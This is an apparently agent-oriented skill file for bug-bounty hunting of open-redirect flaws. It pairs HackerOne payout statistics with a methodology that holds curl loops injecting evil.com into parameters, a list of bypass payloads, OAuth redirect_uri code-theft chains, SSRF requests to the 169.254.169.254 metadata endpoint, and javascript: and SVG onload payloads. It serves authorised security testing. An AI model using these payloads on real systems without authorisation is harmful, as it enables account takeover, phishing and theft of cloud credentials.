---
name: open-redirect
description: >-
  Hunt Open Redirect — all types including low-impact, chained to OAuth token theft → ATO, phishing chains.
  URL parameter manipulation, JavaScript redirect, meta refresh, header injection. Use when hunting redirect
  bugs or building ATO chains. Combined with the HackerOne field guide (real disclosed-report data: where it
  pays, quick wins, payload banks). Hunt open redirects and redirect-chain abuse. Use when testing
  login/logout, OAuth callbacks, URL shorteners, and return/next parameters. Backed by 385 disclosed
  HackerOne reports.
---

# Open Redirect — Combined Field Guide

**Merged skill.** This fuses two complementary sources into one reference:

- **Part 1 — HackerOne field guide:** statistics from disclosed reports, "where it pays," quick wins, and curated payload banks.
- **Part 2 — Bug hunter methodology:** autonomous testing priority, canary discipline, crown-jewel targeting, OOB/validation gates, and reporting guidance.

**How to use:** Open with Part 2 for execution discipline (set your canary, know your success/failure gate). Use Part 1 to prioritize targets and pull payloads. Before reporting, run the validation gates in both parts.

---

<!-- ============ PART 1: HACKERONE FIELD GUIDE (data + payloads) ============ -->

# Open Redirect — HackerOne field guide

Built from **385** publicly disclosed HackerOne reports (2014–2026). Corpus: `~/.local/share/hackerone-reports/`.

**Reference files (load on demand):**

- `references/payloads.md` — payload banks, probes, wordlists, Nuclei templates, observed parameters
- `references/techniques.md` — quick wins, bypasses, real-report techniques, deeper checklists

## Signal

- Reports: **385** · paid: **78**
- Median bounty **$300** · p90 **$1,120** · max **$3,000** · total **$39,824**
- Median upvotes **12**

## Where it pays

| Program | Reports | Bounty | Upvotes |
|---|---|---|---|
| X / xAI | 17 | $8,120 | 787 |
| Internet Bug Bounty | 4 | $5,400 | 79 |
| Uber | 7 | $5,000 | 217 |
| HackerOne | 22 | $2,000 | 550 |
| Slack | 8 | $1,600 | 61 |
| Open-Xchange | 2 | $1,566 | 63 |
| Shopify | 20 | $1,500 | 347 |
| LocalTapiola | 7 | $1,200 | 70 |

## Where to look

Parameters, endpoints, and fields that commonly carry this bug:

`next` `url` `return` `redirect` `redirect_uri` `continue` `dest` `callback` `image_url` `checkout`

## Tools

`Burp` · `gf redirect` · `waybackurls` · `ffuf`

## Escalation chains

- Open redirect -> OAuth token theft.
- Open redirect -> SSRF allowlist bypass.
- Open redirect -> phishing.

## Related

- `oauth-oidc` (177 reports)
- `ssrf` (337 reports)
- `xss` (2,569 reports)

## Reporting bar

- Prove real impact on a second controlled account or a safe callback.
- Keep the PoC minimal and reproducible; include raw requests and exact IDs.
- Stay inside program scope and follow disclosure rules.

---

<!-- ============ PART 2: BUG HUNTER METHODOLOGY (execution + validation) ============ -->

# HUNT-OPEN-REDIRECT — Open Redirect

## Crown Jewel Targets

Open redirect alone is Low. Chained to OAuth = Critical (ATO).

**Highest-value chains:**
- **Open redirect → OAuth auth code theft** — redirect_uri contains open redirect on trusted domain → auth code sent to attacker → ATO
- **Open redirect → phishing** — users trust the URL because it starts with target.com
- **Open redirect → SSRF escalation** — if redirect followed server-side → SSRF
- **Open redirect → session fixation** — force user to login endpoint with pre-set session

---

## Attack Surface Signals

```
?redirect=
?next=
?url=
?return=
?returnTo=
?continue=
?dest=
?destination=
?go=
?forward=
?location=
?target=
?redir=
?redirect_uri=
?callback=
?checkout_url=
?success_url=
?cancel_url=
/logout?returnTo=
/login?next=
/sso?callback=
```

---

## Step-by-Step Hunting Methodology

### Phase 1 — Discover Redirect Parameters
```bash
# Extract all redirect candidates from crawl
cat recon/$TARGET/urls.txt | gf redirect > recon/$TARGET/redirect-candidates.txt
wc -l recon/$TARGET/redirect-candidates.txt

# Less common param names
grep -E "(\?|&)(return|next|dest|go|forward|location|to|jump|target|out|link|logout)" \
  recon/$TARGET/urls.txt >> recon/$TARGET/redirect-candidates.txt
```

### Phase 2 — Basic Test
```bash
COLLAB="https://evil.com"
cat recon/$TARGET/redirect-candidates.txt | qsreplace "$COLLAB" | while read url; do
  LOC=$(curl -s -I --max-redirs 0 "$url" | grep -i "^location:")
  STATUS=$(curl -s -o /dev/null -w "%{http_code}" --max-redirs 0 "$url")
  [ -n "$LOC" ] && echo "$STATUS | $LOC | $url"
done
```

### Phase 3 — Bypass Techniques
```bash
BASE_URL="https://$TARGET/redirect?url="
PAYLOADS=(
  "https://evil.com"
  "//evil.com"
  "/\\evil.com"
  "https://$TARGET@evil.com"
  "https://evil.com%23.$TARGET"
  "https://evil.com%09"
)
for P in "${PAYLOADS[@]}"; do
  LOC=$(curl -s -I --max-redirs 0 "${BASE_URL}${P}" | grep -i "^location:")
  echo "$P → $LOC"
done
```

### Phase 3b — DOM-based open redirect (client-side sink)
Server-side `Location:` grepping misses redirects that happen purely in JS. Source (`location.hash`/`location.search`/`document.referrer`) assigned to a navigation sink.
```bash
grep -rEn "location *=|location\.(href|assign|replace)\(|window\.open\(" recon/$TARGET/ --include="*.js" \
  | grep -iE "location\.(hash|search)|URLSearchParams|getParameter|referrer"
# Confirm in a browser (curl can't): open  https://$TARGET/page#https://evil.com  (or ?url=...)
# Common shape:  var u=new URLSearchParams(location.search).get('url'); location=u;
```
(PortSwigger: DOM-based open redirection.)

### Phase 4 — OAuth Chain Test
```bash
# If target has OAuth, check if redirect_uri accepts open redirect
grep -i "oauth\|authorize\|redirect_uri" recon/$TARGET/urls.txt | head -20

# Construct OAuth URL with open redirect as redirect_uri
# Normal: redirect_uri=https://target.com/callback
# Attack: redirect_uri=https://target.com/redirect?url=https://evil.com
OAUTH_URL="https://$TARGET/oauth/authorize"
curl -sv "$OAUTH_URL?response_type=code&client_id=CLIENT_ID&redirect_uri=https://$TARGET/redirect%3Furl%3Dhttps%3A%2F%2Fevil.com" 2>&1 | grep -i "location:"
```

### Phase 5 — Server-Side Redirect (SSRF escalation)
```bash
# If the app fetches the redirect target server-side (302 fetch follow)
curl -s "https://$TARGET/proxy?url=https://evil.com/redirect-to-169.254.169.254/latest/meta-data/"

# Or: if app makes HTTP request to the redirect destination
curl -s "https://$TARGET/fetch?url=http://169.254.169.254/latest/meta-data/" \
  -H "Cookie: $SESSION"
```

---

## Automation
```bash
# openredirex
pip3 install openredirex
openredirex -l recon/$TARGET/redirect-candidates.txt -p evil.com

# nuclei
nuclei -u https://$TARGET -t redirect/ -severity medium,high

# gf + qsreplace
cat recon/$TARGET/urls.txt | gf redirect | qsreplace "https://evil.com" | \
  xargs -I{} curl -s -o /dev/null -w "%{http_code} %{redirect_url}\n" --max-redirs 0 {}
```

---

## Chain Table

| Open redirect finding | Chain to | Impact |
|----------------------|----------|--------|
| Any open redirect | OAuth redirect_uri bypass | Auth code theft → ATO |
| Any open redirect | Phishing URL with target domain | Social engineering |
| Server-side redirect | SSRF via followed redirect | Internal service access |
| Logout redirect | Session fixation | Force login with known session |

---

## Validation

✅ Location header in response points to evil.com (your controlled domain)
✅ Browser follows redirect to attacker-controlled page

**Severity:**
- Redirect alone: Low (most programs)
- Chains to OAuth code theft → ATO: High/Critical
- Chains to phishing with brand name: Low-Medium
- Server-side → SSRF: High

## Web-Research Methodology Additions (2026)

Research basis: the Intigriti researcher guide "Open URL redirects: A complete guide" (Jan 2025, updated Oct 2026) and HackTricks "Open Redirect" (parser differentials, allowlist footguns, modern XSS pivots, 2024-2026 CVE chains). Both stress the escalation theme already in this skill: many programs reject a standalone redirect — prove impact (OAuth code/token theft, XSS, SSRF, CSRF) or don't submit.

### A. Discovery checklist — concrete places, params, headers, flows to look

- **Expanded parameter list:** `return_to`, `return_path`, `rurl`, `redirect_url`, `redirect_uri`, `success_url`, `cancel_url`, `image_url`, `checkout_url`, `clickurl`, `jump`, `jump_url`, `goto`, `forward`, `forward_url`, `pic`, `originUrl`, `desturl`, `request`, `backurl`, `RedirectUrl`, `ReturnUrl`, `burl`, `qurl`, `u`, `u1`, `page`, `uri`, `link`, `src`, `service`, `sp_url`.
- **Where to look:** sign-in/register/sign-out, password-reset token links (the generated link itself may carry a redirect param), profile, email-verification links, error pages, and any multi-step action.
- **Server vs client type:** a 3xx + `Location:` header is server-side; a redirect after a delay with no `Location` is client-side (meta refresh / JS). Client-side is the one that can escalate to DOM XSS.
- **SPA sinks in JS bundles:** `location.assign/replace/href`, `window.open`, `history.pushState/replaceState`, `hashchange`, `postMessage` handlers that read query/hash, framework helpers for `next`/`returnUrl`.
- **OAuth/OIDC allowlist footguns:** `redirect_uri`, `returnTo`, `RelayState` validated by regex/glob, wildcard-only host patterns, or "validate parsed URL, redirect raw input" mismatches. Repeat tests with a victim already authenticated to the IdP (silent approval).
- **SVG uploads** with `onload="window.location=..."` as a redirect/XSS pivot.
- **Modern CVE-shaped chains:** fragment smuggling + client-side path traversal (Grafana-style `redirectTo=/%23/..//\//attacker.com`) reaching an auth-token-rotate endpoint.

- **Baseline first:** request each candidate with a benign in-scope value and record status, `Location`, and whether a 3xx or client-side redirect occurs.
- **Two surfaces per host:** test both the server `Location` header and JS/meta sinks; fixing one doesn't fix the other.
- **Allowlist internals:** if the app says "only internal hosts," test alternative host notations and wildcard DNS resolving to loopback.
- **Context inventory:** note where the redirect lands — logout, login, OAuth callback, password reset, file/image fetcher — because that determines the chain.
- **Follow-redirect behavior:** for SSRF chains, check whether the server-side fetcher follows 30x by default (most do).
- **Historical URLs:** mine Wayback/GAU for retired redirect endpoints (`/out`, `/cgi-bin/redirect.cgi`) that still work.
- **Parameter pollution:** try duplicate redirect params (`?next=/safe&next=//attacker`) — parsers may validate the first and use the last.
- **Encoding layers:** double-encode delimiters (`%2523`, `%252f`) and test mixed case in scheme names.
- **SVG route:** check whether uploaded SVG is served inline with `image/svg+xml` (so `onload` executes) — otherwise it isn't a pivot.

### B. Techniques & bypasses — specific actionable techniques/payload shapes

- **Scheme blacklist bypasses:** `//attacker.tld`, `/%0A/attacker.tld`, `/%0D/`, `/%09/`, `/+/`, `///attacker.tld`, `\\attacker.tld`; authority-component checks: `http:example.com`, `https:example.com`.
- **Weak domain validation:** `https://example.com@attacker.tld`, `https://example.com.attacker.tld`, `https://attacker.tld/example.com`, `https://attacker.tld?example.com`, `%23`/`%00`/`%0A`/`%0D`/`%09` before the trusted string, and the `°` separator trick.
- **TLD/parser confusion:** `example.comattacker.com`, `.company` (a real TLD), `%E3%80%82` (encoded ideographic full stop).
- **Userinfo / backslash differentials:** `https://trusted.tld@attacker.tld/`, `https://trusted.tld[@attacker.tld`, `%5B@`, and backslash normalization differences where the backend treats `\` as a path char but the browser treats `trusted.tld` as userinfo.
- **Loopback notations for allowlisted internal hosts:** `127.1`, `2130706433`, `0x7f000001`, `017700000001`, `[::1]`, `[::ffff:127.0.0.1]`, `localhost.`, plus wildcard DNS `lvh.me`, `sslip.io`, `localtest.me` — useful when only subdomains of X are allowed but resolution must hit loopback.
- **javascript: pivots (DOM sinks only):** `javascript:alert(1)`, case variants, `java%0d%0ascript%0d%0a:`, `jav%09ascript:`, `javascript://%250Aalert(1)`, `javascript://whitelisted.com/%0Aalert(1)`, `/%09/javascript:alert(1)`, backslash-obfuscated forms.
- **meta refresh / JS fallback** (`<meta http-equiv="refresh" content="0;url=//attacker">`) when no `Location` header is emitted — still useful for phishing.
- **Escalations:** OAuth `redirect_uri` manipulation to leak `response_type=token` access codes; chaining a GET-state-changing endpoint lacking CSRF (`/redirect?url=/api/account/profile?username=...`); SSRF allowlist bypass because fetch follows redirects (`/image-loader?url=https://trusted/redirect?url=http://169.254.169.254/...`).
- **SVG upload redirect:** `<svg onload="window.location='http://attacker'">`.

### C. Validation / proof bar — how to confirm and avoid false positives

- **Basic proof:** the `Location` header (or meta-refresh/JS target) points to your controlled domain, and a real browser follows it there. Use `curl -s -I --max-redirs 0` to inspect raw `Location`.
- **DOM redirects need a browser:** curl cannot observe a JS/meta redirect — open the URL and confirm navigation, then trace the sink with DOM Invader or Untrusted Types.
- **Parser differentials must be browser-proven:** the server accepting a crafted string is not enough; show the browser actually navigates off-site (userinfo/backslash/`%E3%80%82` cases are parser-specific).
- **OAuth chain proof:** repeat with the victim authenticated to the IdP to get silent approval, and show a captured code/token plus a session created in the victim's account. Don't claim ATO from an unauthenticated redirect alone.
- **SSRF chain proof:** show an actual internal/metadata response returned through the followed redirect.
- **Avoid false positives:** a relative-path-only "redirect," a fallback to a default path, or a `javascript:` payload that never reaches a sink are not open redirects. Many programs reject standalone redirect reports — lead with the chain and its impact.
- **Dual-surface:** check both server-side and client-side redirectors; fixing one path often leaves the other.

- **Header proof:** show the raw `Location` pointing at your controlled host with `curl -I --max-redirs 0`, then show a browser navigating there.
- **DOM proof:** use DOM Invader to show the source→sink flow (e.g. `?url=` → `location.href`) and a live browser navigation.
- **Parser-differential proof:** for userinfo/backslash/encoded-dot payloads, show the browser's final URL — a server that merely emits the string is insufficient.
- **OAuth proof:** with a victim logged into the IdP, capture the code/token delivered to your host and show a session created in the victim account.
- **SSRF proof:** show an internal response body (metadata or internal service) retrieved through the followed redirect.
- **Null result:** if every payload falls back to a default path or yields only a relative path, record "not open" and move on.
- **Fragment-smuggling chain:** confirm the validator inspects `URL.Path` but ignores `URL.Fragment`, then show the emitted `Location` still contains the attacker host.
- **CSRF chain:** show a state-changing GET lacking CSRF actually executed in the victim account after the redirect.
- **Phishing-only severity:** if the only impact is a trusted-looking URL, report Low/Medium and don't claim ATO.
- **Client-side redirect without Location:** verify with a delayed navigation in-browser, since `curl` will show no 3xx.

### D. Sources — numbered list of URLs you actually fetched

1. https://www.intigriti.com/researchers/blog/hacking-tools/open-url-redirects-a-complete-guide-to-exploiting-open-url-redirect-vulnerabilities
2. https://hacktricks.wiki/en/pentesting-web/open-redirect.html
